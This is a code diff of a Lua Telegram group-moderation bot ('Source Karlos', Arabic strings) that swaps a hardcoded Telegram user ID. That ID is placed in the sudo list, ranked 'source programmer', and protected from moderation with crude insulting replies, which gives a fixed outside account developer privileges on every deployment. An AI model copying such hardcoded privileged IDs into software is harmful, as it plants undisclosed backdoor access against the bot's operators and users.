@@ -133,7 +133,7 @@ print("\27[36m"..[[
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,167304135,782717203}
+SudoIds = {Config.SudoIds,146603614,782717203}
 Karlos = Config.Karlos
 TokenBot = Config.TokenBot
 NameBot = (DevAbs:get(Karlos..'Abs:NameBot') or 'كارلوس')
@@ -595,7 +595,7 @@ end ,nil)
 end
 --     Source Karlos     --
 local AbsRank = function(msg) if SudoId(msg.sender_user_id_) then KarlosTeaM  = "المطور" elseif SecondSudo(msg) then KarlosTeaM = "المطور" elseif SudoBot(msg) then KarlosTeaM = "المطور" elseif ManagerAll(msg) then KarlosTeaM = "المدير" elseif AdminAll(msg) then KarlosTeaM = "الادمن" elseif AbsConstructor(msg) then KarlosTeaM = "المالك" elseif BasicConstructor(msg) then KarlosTeaM = "المنشئ" elseif Constructor(msg) then KarlosTeaM = "المنشئ" elseif Manager(msg) then KarlosTeaM = "المدير" elseif Admin(msg) then KarlosTeaM = "الادمن" else KarlosTeaM = "العضو" end return KarlosTeaM end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(167304135) then KarlosTeaM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Karlos) then KarlosTeaM = 'البوت' elseif SudoId(user_id) then KarlosTeaM = 'المطور الاساسي' elseif DevAbs:sismember(Karlos..'Abs:SecondSudo:', user_id) then KarlosTeaM = 'المطور الثانوي' elseif DevAbs:sismember(Karlos..'Abs:SudoBot:', user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(Karlos..'Abs:ManagerAll:', user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(Karlos..'Abs:AdminAll:', user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(Karlos..'Abs:VipAll:', user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(Karlos..'Abs:AbsConstructor:'..chat_id, user_id) then KarlosTeaM = 'المالك' elseif DevAbs:sismember(Karlos..'Abs:BasicConstructor:'..chat_id, user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(Karlos..'Abs:Constructor:'..chat_id, user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(Karlos..'Abs:Managers:'..chat_id, user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(Karlos..'Abs:Admins:'..chat_id, user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(Karlos..'Abs:VipMem:'..chat_id, user_id) then  KarlosTeaM = DevAbs:get(Karlos.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(Karlos..'Abs:Cleaner:'..chat_id, user_id) then  KarlosTeaM = DevAbs:get(Karlos.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else KarlosTeaM = DevAbs:get(Karlos.."Abs:mem:Rd"..chat_id) or 'العضو' end return KarlosTeaM end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(146603614) then KarlosTeaM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Karlos) then KarlosTeaM = 'البوت' elseif SudoId(user_id) then KarlosTeaM = 'المطور الاساسي' elseif DevAbs:sismember(Karlos..'Abs:SecondSudo:', user_id) then KarlosTeaM = 'المطور الثانوي' elseif DevAbs:sismember(Karlos..'Abs:SudoBot:', user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(Karlos..'Abs:ManagerAll:', user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(Karlos..'Abs:AdminAll:', user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(Karlos..'Abs:VipAll:', user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(Karlos..'Abs:AbsConstructor:'..chat_id, user_id) then KarlosTeaM = 'المالك' elseif DevAbs:sismember(Karlos..'Abs:BasicConstructor:'..chat_id, user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(Karlos..'Abs:Constructor:'..chat_id, user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(Karlos..'Abs:Managers:'..chat_id, user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(Karlos..'Abs:Admins:'..chat_id, user_id) then KarlosTeaM = DevAbs:get(Karlos.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(Karlos..'Abs:VipMem:'..chat_id, user_id) then  KarlosTeaM = DevAbs:get(Karlos.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(Karlos..'Abs:Cleaner:'..chat_id, user_id) then  KarlosTeaM = DevAbs:get(Karlos.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else KarlosTeaM = DevAbs:get(Karlos.."Abs:mem:Rd"..chat_id) or 'العضو' end return KarlosTeaM end
 --     Source Karlos     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
@@ -4344,7 +4344,7 @@ if tonumber(result.id_) == tonumber(DevId) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(167304135) then 
+if tonumber(result.id_) == tonumber(146603614) then 
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
@@ -4375,7 +4375,7 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(167304135) then  
+if tonumber(result.sender_user_id_) == tonumber(146603614) then  
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
